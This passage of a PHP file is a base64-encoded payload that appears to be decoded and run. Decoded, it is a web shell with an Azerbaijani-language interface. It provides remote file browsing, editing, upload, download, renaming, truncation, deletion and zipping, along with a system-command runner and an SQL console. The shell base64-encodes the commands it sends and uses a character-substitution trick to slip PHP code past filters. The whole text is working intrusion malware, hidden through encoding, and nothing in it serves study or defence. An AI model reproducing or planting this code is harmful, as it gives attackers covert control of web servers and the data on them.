RmYXlsQWRpKSkKICAgICAgICB7CiAgICAgICAgICAgIHVuc2V0KCRfU0VTU0lPTlsneXNfdG9vayddKTsKICAgICAgICAgICAgJGNvbnRlbnQgPSAkX1BPU1RbJ2NvbnRlbnQnXTsKCiAgICAgICAgICAgICRjYyA9ICBhcnJheSgnYScsJ2knLCdlJywncycsJ2wnLCdiJywndScsJ28nLCdwJywnaCcsIigiLCIpIiwiPCIsIj4iLCI/IiwiOyIsIlsiLCJdIiwiJCIpOwogICAgICAgICAgICBmb3JlYWNoKCRjYyBBUyAkazE9PiR2MSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGNvbnRlbnQgPSBzdHJfcmVwbGFjZSgnfDonLiRrMS4nOnwnICwgJHYxICwgJGNvbnRlbnQpOwogICAgICAgICAgICB9CgogICAgICAgICAgICAkZmF5bEFjaCA9IGZvcGVuKCRkZWZhdWx0X2RpciAuICRheWlyaWNpIC4gJGZheWxBZGksICJ3KyIpOwogICAgICAgICAgICBmd3JpdGUoJGZheWxBY2gsICRjb250ZW50KTsKICAgICAgICAgICAgZmNsb3NlKCRmYXlsQWNoKTsKICAgICAgICAgICAgJHN0YXR1cyA9ICIgPHNwYW4gY2xhc3M9J3FhbGluJz5VJiMyODc7dXJsYSB5YWRkYSBzYXhsYW4mIzMwNTtsZCYjMzA1OyE8L3NwYW4+IjsKICAgICAgICB9CiAgICAgICAgJG94dVVybCA9ICI/bmU9ZmF5bF9veHUmZmF5bD0iLnVybGVuY29kZSh1cmxlbmNvZGUoc2hpZnJlbGUoJGZheWxBZGkpKSkuIiZxb3ZsdXE9Ii51cmxlbmNvZGUodXJsZW5jb2RlKHNoaWZyZWxlKCRkZWZhdWx0X2RpcikpKTsKICAgICAgICAkZWxhdmVCdG4gPSBpc193cml0ZWFibGUoJGRlZmF1bHRfZGlyIC4gJGF5aXJpY2kgLiAkZmF5bEFkaSkgPyAiIiA6ICIgZGlzYWJsZWQiOwogICAgICAgIHByaW50ICI8ZGl2PkZheWwgYWQmIzMwNTs6IDxhIGNsYXNzPSdxYWxpbicgaHJlZj0namF2YXNjcmlwdDpzZWhpZmUoXCJ7JG94dVVybH1cIiknPiIuaHRtbHNwZWNpYWxjaGFycygkZmF5bEFkaSkuIjwvYT48YnIvPjxmb3JtIG1ldGhvZD0nUE9TVCcgc3R5bGU9J3BhZGRpbmc6IDA7IG1hcmdpbjogMDsnPjxidXR0b24gdHlwZT0nc3VibWl0JyBjbGFzcz0nYnRuJyRlbGF2ZUJ0bj4gWWFkZGEgc2F4bGEgPC9idXR0b24+IDxidXR0b24gdHlwZT0nYnV0dG9uJyBvbmNsaWNrPSdzaGlmcmVsZWUoKSc+IFNoaWZyZWxlIGF0YXNoIDwvYnV0dG9uPiAkc3RhdHVzPC9kaXY+IjsKICAgICAgICBwcmludCAiPGlucHV0IHR5cGU9J2hpZGRlbicgdmFsdWU9J2ZheWxfcmVkYWt0ZScgbmFtZT0nbmUnPjxpbnB1dCB0eXBlPSdoaWRkZW4nIHZhbHVlPSciLnNoaWZyZWxlKCRmYXlsQWRpKS4iJyBuYW1lPSdmYXlsJz48aW5wdXQgdHlwZT0naGlkZGVuJyB2YWx1ZT0nIi51cmxlbmNvZGUoc2hpZnJlbGUoJGRlZmF1bHRfZGlyKSkuIicgbmFtZT0ncW92bHVxJz48aW5wdXQgdHlwZT0naGlkZGVuJyB2YWx1ZT0nIi50b29rWWFyYXQoInlzX3Rvb2siKS4iJyBuYW1lPSd0b29rJz48dGV4dGFyZWEgbmFtZT0nY29udGVudCcgY2xhc3M9J2ZpbGVfZWRpdCc+Ii5odG1sc3BlY2lhbGNoYXJzKGZpbGVfZ2V0X2NvbnRlbnRzKCRkZWZhdWx0X2RpciAuICRheWlyaWNpIC4gJGZheWxBZGkpKS4iPC90ZXh0YXJlYT48L2Zvcm0+IjsKICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICBwcmludCAnRXJyb3IhICcgLiAgaHRtbHNwZWNpYWxjaGFycygkZGVmYXVsdF9kaXIgLiAkYXlpcmljaSAuICRmYXlsQWRpKTsKICAgIH0KfQplbHNlCnsKICAgIGlmKGlzX2RpcigkZGVmYXVsdF9kaXIpKQogICAgewogICAgICAgIGlmKGlzX3JlYWRhYmxlKCRkZWZhdWx0X2RpcikpCiAgICAgICAgewogICAgICAgICAgICAkcW92bHVxSWNoaSA9IHNjYW5kaXIoJGRlZmF1bHRfZGlyKTsKICAgICAgICAgICAgZm9yZWFjaCgkcW92bHVxSWNoaSBBUyAmJGVtZWxlbW50KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkYXlpcmljaSA9IHN1YnN0cigkZGVmYXVsdF9kaXIsc3RybGVuKCRkZWZhdWx0X2RpciktMSkhPSIvIiAmJiBzdWJzdHIoJGVtZWxlbW50LDAsMSkhPSIvIiA/ICIvIiA6ICIiOwogICAgICAgICAgICAgICAgaWYoaXNfZGlyKCRkZWZhdWx0X2RpciAuICRheWlyaWNpIC4gJGVtZWxlbW50KSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkZW1lbGVtbnQgPSAiMCIuJGVtZWxlbW50OwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRlbWVsZW1udCA9ICIxIi4kZW1lbGVtbnQ7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgYXNvcnQoJHFvdmx1cUljaGkpOwogICAgICAgICAgICBwcmludCAiPHRhYmxlIGNsYXNzPSdmTWFuYWdlcicgc3R5bGU9J3dpZHRoOiAxMDAlOyc+PHRoZWFkPjx0ciBjbGFzcz0ncWFsaW4nPjx0aD5zPC90aD48dGg+RmF5bDwvdGg+PHRoPlNpemU8L3RoPjx0aD5UYXJpeDwvdGg+PHRoPk93bmVyL0dyb3VwPC90aD48dGg+UGVybWlzc2lvbnM8L3RoPjx0aD5BY3Rpb25zPC90aD48L3RyPjwvdGhlYWQ+PHRib2R5PiI7CiAgICAgICAgICAgIGZvcmVhY2goJHFvdmx1cUljaGkgQVMgJGVsZW1lbnQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICR1cmwgPSAiIjsKICAgICAgICAgICAgICAgICRlbGVtZW50ID0gc3Vic3RyKCRlbGVtZW50LDEpOwogICAgICAgICAgICAgICAgJGZheWxBZGlUYW0gPSAkZGVmYXVsdF9kaXIgLiAkYXlpcmljaSAuICRlbGVtZW50OwogICAgICAgICAgICAgICAgJGF5aXJpY2kgPSBzdWJzdHIoJGRlZmF1bHRfZGlyLHN0cmxlbigkZGVmYXVsdF9kaXIpLTEpIT0iLyIgJiYgc3Vic3RyKCRlbGVtZW50LDAsMSkhPSIvIiA/ICIvIiA6ICIiOwogICAgICAgICAgICAgICAgJGFkaSA9IGlzX2RpcigkZmF5bEFkaVRhbSkgPyAiWyAkZWxlbWVudCBdIiA6ICRlbGVtZW50OwogICAgICAgICAgICAgICAgJGNsYXNzTiA9ICIiOwogICAgICAgICAgICAgICAgaWYoaXNfZGlyKCRmYXlsQWRpVGFtKSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBpZigkZWxlbWVudD09Ii4iKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJHVybCA9ICI/cW92bHVxPSIudXJsZW5jb2RlKHVybGVuY29kZShzaGlmcmVsZSgkZGVmYXVsdF9kaXIpKSk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgaWYoJGVsZW1lbnQ9PSIuLiIpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkeWVuaVVybCA9IGV4cGxvZGUoIi8iLCRkZWZhdWx0X2Rpcik7CiAgICAgICAgICAgICAgICAgICAgICAgIGZvcmVhY2goYXJyYXlfcmV2ZXJzZSgkeWVuaVVybCkgQVMgJGo9PiRxcSkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYodHJpbSgkcXEpIT0iIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1bnNldCgkeWVuaVVybFtjb3VudCgkeWVuaVVybCktJGotMV0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICR1cmwgPSAiP3Fvdmx1cT0iLnVybGVuY29kZSh1cmxlbmNvZGUoc2hpZnJlbGUoaW1wbG9kZSgiLyIsJHllbmlVcmwpKSkpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkdXJsID0gIj9xb3ZsdXE9Ii51cmxlbmNvZGUodXJsZW5jb2RlKHNoaWZyZWxlKCRmYXlsQWRpVGFtKSkpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkY2xhc3NOID0gIiBzdHlsZT0nZm9udC13ZWlnaHQ6IDYwMDsnIjsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkdXJsID0gIj9uZT1mYXlsX294dSZmYXlsPSIudXJsZW5jb2RlKHVybGVuY29kZShzaGlmcmVsZSgkZWxlbWVudCkpKS4iJnFvdmx1cT0iLnVybGVuY29kZSh1cmxlbmNvZGUoc2hpZnJlbGUoJGRlZmF1bHRfZGlyKSkpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJGZheWxkaSA9IGlzX2ZpbGUoJGZheWxBZGlUYW0pOwogICAgICAgICAgICAgICAgJGlzUmVhZGFibGVDb2xvciA9IGlzX3JlYWRhYmxlKCAkZmF5bEFkaVRhbSApICYmIGlzX3dyaXRlYWJsZSggJGZheWxBZGlUYW0gKTsKICAgICAgICAgICAgICAgIHByaW50ICc8dHI+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48L3RkPgogICAgICAgICAgICAgICAgICAgICAgICA8dGQ+PGEgaHJlZj0iamF2YXNjcmlwdDpzZWhpZmUoXCcnLiR1cmwuJ1wnKSInLiRjbGFzc04uJz4nLmh0bWxzcGVjaWFsY2hhcnMoJGFkaSkuJzwvYT48L3RkPgogICAgICAgICAgICAgICAgICAgICAgICA8dGQ+JyAuICgkZmF5bGRpP3NpemVGb3JtYXQoZmlsZXNpemUoJGZheWxBZGlUYW0pKTonJykgLiAnPC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgPHRkPicgLiAoZGF0ZSgnZCBNIFksIEg6aScgLCBmaWxlY3RpbWUoJGZheWxBZGlUYW0pKSkgLiAnPC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgPHRkPicgLiBodG1sc3BlY2lhbGNoYXJzKGZpbGVvd25lcigkZmF5bEFkaVRhbSkpIC4gJzwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZCcgLiAoJGlzUmVhZGFibGVDb2xvcj8nIHN0eWxlPSJjb2xvcjogZ3JlZW47Iic6JycpIC4gJz4nIC4gc3Vic3RyKHNwcmludGYoJyVvJywgZmlsZXBlcm1zKCggJGZheWxBZGlUYW0gKSkpLCAtNCkgLiAnPC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgPHRkPic7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCBpc19maWxlKCRmYXlsQWRpVGFtKSApCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICgnIDxhIGhyZWY9ImphdmFzY3JpcHQ6c2VoaWZlKFwnJy5zdHJfcmVwbGFjZSgiZmF5bF9veHUiLCJmYXlsX3l1a2xlIiwkdXJsKS4nXCcpIicuJGNsYXNzTi4nPkRvd25sb2FkPC9hPiB8ICcpIC4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAoJyA8YSBocmVmPSJqYXZhc2NyaXB0OmNoYW5nZUZpbGVOYW1lKFwnJyAuIGh0bWxzcGVjaWFsY2hhcnMoJGFkaSkgLiAnXCcgLCBcJycuc3RyX3JlcGxhY2UoImZheWxfb3h1IiwiZmF5bF9hZF9kZXlpc2giLCR1cmwpLidcJyk7IicuJGNsYXNzTi4nPlJlbmFtZTwvYT4gfCAnKSAuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKCcgPGEgaHJlZj0iamF2YXNjcmlwdDpmYXlsU2lmaXJsYShcJycuc3RyX3JlcGxhY2UoImZheWxfb3h1IiwiZmF5bF9zaWZpcmxhIiwkdXJsKS4nXCcpOyInLiRjbGFzc04uJz5UcnVuY2F0ZTwvYT4gfCAnKSAuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKCcgPGEgaHJlZj0iamF2YXNjcmlwdDpmYXlsU2lsKFwnJy5zdHJfcmVwbGFjZSgiZmF5bF9veHUiLCJmYXlsX3NpbCIsJHVybCkuJ1wnKSInLiRjbGFzc04uJz5EZWxldGU8L2E+Jyk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSBpZiggJGFkaSAhPSAnWyAuIF0nICYmICRhZGkgIT0gJ1sgLi4gXScgKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAoJyA8YSBocmVmPSJqYXZhc2NyaXB0OnppcGxlKFwnJyAuIHVybGVuY29kZSh1cmxlbmNvZGUoc2hpZnJlbGUoJGZheWxBZGlUYW0pKSkgLiAnXCcpIicuJGNsYXNzTi4nPlppcDwvYT4gfCAnKSAuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKCcgPGEgaHJlZj0iamF2YXNjcmlwdDpzaWxQYXBrYShcJycgLiB1cmxlbmNvZGUodXJsZW5jb2RlKHNoaWZyZWxlKCRmYXlsQWRpVGFtKSkpIC4gJ1wnKSInLiRjbGFzc04uJz5TaWw8L2E+Jyk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJzwvdGQ+CiAgICAgICAgICAgICAgICAgICAgPC90cj4nOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIHByaW50ICI8ZGl2IHN0eWxlPSdtYXJnaW46IDEwcHggMHB4OycgY2xhc3M9J3FhbGluJz5QZXJtaXNzaW9ucyBkZW5pZGVkITwvZGl2PiI7CiAgICAgICAgfQogICAgfQp9CnByaW50ICI8L3Rib2R5PjwvdGFibGU+IjsKPz4KCjxocj4KPGEgaHJlZj0iamF2YXNjcmlwdDpuZXdGaWxlKCk7Ij5ZZW5pIGZheWw8L2E+IHwgPGEgaHJlZj0iamF2YXNjcmlwdDpuZXdQYXBrYSgpOyI+WWVuaSBwYXBrYTwvYT48YnI+CjxhIGhyZWY9ImphdmFzY3JpcHQ6c2VoaWZlKCc/bmU9c2lzdGVtX2tvbSZxb3ZsdXE9PD89dXJsZW5jb2RlKHVybGVuY29kZShzaGlmcmVsZSgkZGVmYXVsdF9kaXIpKSk/PicpIj5JY3JhIGVkaW48L2E+PGJyPgo8YSBocmVmPSJqYXZhc2NyaXB0OnNlaGlmZSgnP25lPXNrbCcpOyI+U1FMPC9hPjxicj4KCjxmb3JtIG1ldGhvZD0iUE9TVCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+CiAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJuZSIgdmFsdWU9ImZheWxfdXBsIj4KICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InFvdmx1cSIgdmFsdWU9Ijw/PXVybGVuY29kZShzaGlmcmVsZSgkZGVmYXVsdF9kaXIpKT8+Ij4KICAgIDxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJ1ZmF5bCI+CiAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iVXBsIj4KPC9mb3JtPgoKPGZvcm0gbWV0aG9kPSJQT1NUIiBpZD0icG9zdF9mb3JtIiBzdHlsZT0iZGlzcGxheTogbm9uZTsiPjwvZm9ybT4KPHNjcmlwdD4KZnVuY3Rpb24gc2VoaWZlKHVybCkKewogICAgdmFyIGlucHV0bGFyID0gIiI7CiAgICB1cmwgPSB1cmwuc3BsaXQoIj8iKTsKICAgIGlmKHR5cGVvZiB1cmxbMV09PSJ1bmRlZmluZWQiKSByZXR1cm47CiAgICB1cmwgPSB1cmxbMV0uc3BsaXQoIiYiKTsKICAgIGZvcih2YXIgbiBpbiB1cmwpCiAgICB7CiAgICAgICAgdmFyIGtleUFuZFZhbHVlID0gdXJsW25dLnNwbGl0KCI9Iik7CiAgICAgICAgaWYodHlwZW9mIGtleUFuZFZhbHVlWzFdPT0idW5kZWZpbmVkIikgY29udGludWU7CiAgICAgICAgaW5wdXRsYXIrPSI8aW5wdXQgbmFtZT0nIitrZXlBbmRWYWx1ZVswXSsiJyB2YWx1ZT0nIitrZXlBbmRWYWx1ZVsxXSsiJyB0eXBlPSdoaWRkZW4nPiI7CiAgICB9CiAgICBkb2N1bWVudC5hbGwoInBvc3RfZm9ybSIpLmlubmVySFRNTCA9IGlucHV0bGFyOwogICAgZG9jdW1lbnQuYWxsKCJwb3N0X2Zvcm0iKS5zdWJtaXQoKTsKfQpmdW5jdGlvbiBmYXlsU2lsKHVybCkKewogICAgaWYoIGNvbmZpcm0oJ0VtaW5zZW4gYXRhc2g/JykgKQogICAgewogICAgICAgIHNlaGlmZSh1cmwpOwogICAgfQp9CmZ1bmN0aW9uIGZheWxTaWZpcmxhKHVybCkKewogICAgaWYoIGNvbmZpcm0oJ0VtaW5zZW4gYXRhc2g/JykgKQogICAgewogICAgICAgIHNlaGlmZSh1cmwpOwogICAgfQp9CmZ1bmN0aW9uIGNoYW5nZUZpbGVOYW1lKG5hbWUsIHVybCkKewogICAgdmFyIGdldE5ld05hbWUgPSBwcm9tcHQoJ0NoYW5nZSBmaWxlIG5hbWU6JyAsIG5hbWUpOwogICAgaWYoIGdldE5ld05hbWUgKQogICAgewogICAgICAgIHNlaGlmZSh1cmwgKyAiJm5ld19uYW1lPSIgKyBnZXROZXdOYW1lKTsKICAgIH0KfQpmdW5jdGlvbiBuZXdGaWxlKCkKewogICAgdmFyIGdldE5ld05hbWUgPSBwcm9tcHQoJ0ZpbGUgbmFtZTonKTsKICAgIGlmKCBnZXROZXdOYW1lICkKICAgIHsKICAgICAgICBzZWhpZmUoIj9uZT1mYXlsX3lhcmF0JmFkPSIgKyBnZXROZXdOYW1lICsgIiZxb3ZsdXE9PD89dXJsZW5jb2RlKHVybGVuY29kZShzaGlmcmVsZSgkZGVmYXVsdF9kaXIpKSk/PiIpOwogICAgfQp9CmZ1bmN0aW9uIG5ld1BhcGthKCkKewogICAgdmFyIGdldE5ld05hbWUgPSBwcm9tcHQoJ0ZpbGUgbmFtZTonKTsKICAgIGlmKCBnZXROZXdOYW1lICkKICAgIHsKICAgICAgICBzZWhpZmUoIj9uZT1wYXBrYV95YXJhdCZhZD0iICsgZ2V0TmV3TmFtZSArICImcW92bHVxPTw/PXVybGVuY29kZSh1cmxlbmNvZGUoc2hpZnJlbGUoJGRlZmF1bHRfZGlyKSkpPz4iKTsKICAgIH0KfQpmdW5jdGlvbiBzaXN0ZW1Lb20oKQp7CiAgICB2YXIga29tYW5kYSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlbXJfZXRfYXRhc2gnKS52YWx1ZTsKICAgIGlmKCBrb21hbmRhICkKICAgIHsKICAgICAgICBzZWhpZmUoIj9uZT1zaXN0ZW1fa29tJmtvbT0iICsgYjY0RW5jb2RlVW5pY29kZShrb21hbmRhKSArICImcW92bHVxPTw/PXVybGVuY29kZSh1cmxlbmNvZGUoc2hpZnJlbGUoJGRlZmF1bHRfZGlyKSkpPz4iKTsKICAgIH0KfQpmdW5jdGlvbiBza2xfYmFzKCkKewogICAgdmFyIHNrbEVtciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdza2xfZW1yJykudmFsdWU7CiAgICAKICAgIHNlaGlmZSgiP25lPXNrbCZlbXI9IiArIGI2NEVuY29kZVVuaWNvZGUoc2tsRW1yKSk7Cn0KZnVuY3Rpb24gYjY0RW5jb2RlVW5pY29kZShzdHIpCnsKICAgIHJldHVybiBidG9hKGVuY29kZVVSSUNvbXBvbmVudChzdHIpLnJlcGxhY2UoLyUoWzAtOUEtRl17Mn0pL2csCiAgICAgICAgZnVuY3Rpb24gdG9Tb2xpZEJ5dGVzKG1hdGNoLCBwMSkgewogICAgICAgICAgICByZXR1cm4gU3RyaW5nLmZyb21DaGFyQ29kZSgnMHgnICsgcDEpOwogICAgICAgIH0pKTsKfQpmdW5jdGlvbiBnb3RvKCkKewogICAgdmFyIGRpciA9IHByb21wdCgnRGlyOicpOwogICAgaWYoIGRpciApCiAgICB7CiAgICAgICAgc2VoaWZlKCI/cW92bHVxPSIgKyBkaXIpOwogICAgfQp9CmZ1bmN0aW9uIHppcGxlKHFvdmx1cSkKewogICAgdmFyIGRpciA9IHByb21wdCgnRGlyOicgLCAiPD89aHRtbHNwZWNpYWxjaGFycygkZGVmYXVsdF9kaXIpPz4iKTsKICAgIGlmKCBkaXIgKQogICAgewogICAgICAgIHNlaGlmZSgiP25lPXppcGxlJnFvdmx1cT08Pz11cmxlbmNvZGUodXJsZW5jb2RlKHNoaWZyZWxlKCRkZWZhdWx0X2RpcikpKT8+JnpmPSIgKyBxb3ZsdXEgKyAiJnNhdmVfdG89IiArIGI2NEVuY29kZVVuaWNvZGUoZGlyKSkKICAgIH0KfQpmdW5jdGlvbiBzaWxQYXBrYShxb3ZsdXEpCnsKICAgIGlmKCBjb25maXJtKCdFbWluc2VuIGF0YXNoPycpICkKICAgIHsKICAgICAgICBzZWhpZmUoIj9uZT1wYXBrYV9zaWwmcW92bHVxPTw/PXVybGVuY29kZSh1cmxlbmNvZGUoc2hpZnJlbGUoJGRlZmF1bHRfZGlyKSkpPz4memY9IiArIHFvdmx1cSkKICAgIH0KfQpmdW5jdGlvbiBzaGlmcmVsZWUoKQp7CiAgICB2YXIgdmFsbCA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlDbGFzc05hbWUoJ2ZpbGVfZWRpdCcpWzBdLnZhbHVlOwogICAgdmFyIHJlcHAgPSBbJ2EnLCdpJywnZScsJ3MnLCdsJywnYicsJ3UnLCdvJywncCcsJ2gnLCJcXCgiLCJcXCkiLCJcXDwiLCJcXD4iLCJcXD8iLCJcXDsiLCJcXFsiLCJcXF0iLCJcXCQiXTsKICAgIGZvcih2YXIgcyBpbiByZXBwKQogICAgewogICAgICAgIHZhciBoID0gcmVwcFtzXTsKICAgICAgICB2YWxsID0gdmFsbC5yZXBsYWNlKG5ldyBSZWdFeHAoaCwgJ2cnKSAsICd8OicrcysnOnwnKTsKICAgIH0KCiAgICBkb2N1bWVudC5nZXRFbGVtZW50c0J5Q2xhc3NOYW1lKCdmaWxlX2VkaXQnKVswXS52YWx1ZSA9IHZhbGw7Cn0KCmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJlbXJfZXRfYXRhc2giKS5hZGRFdmVudExpc3RlbmVyKCJrZXl1cCIsIGZ1bmN0aW9uKGV2ZW50KQp7CiAgICBldmVudC5wcmV2ZW50RGVmYXVsdCgpOwogICAgaWYgKGV2ZW50LmtleUNvZGUgPT09IDEzKQogICAgewogICAgICAgIHNpc3RlbUtvbSgpOwogICAgfQp9KTsKPC9zY3JpcHQ+CjwvYm9keT4KPC9odG1sPg=="));
?>
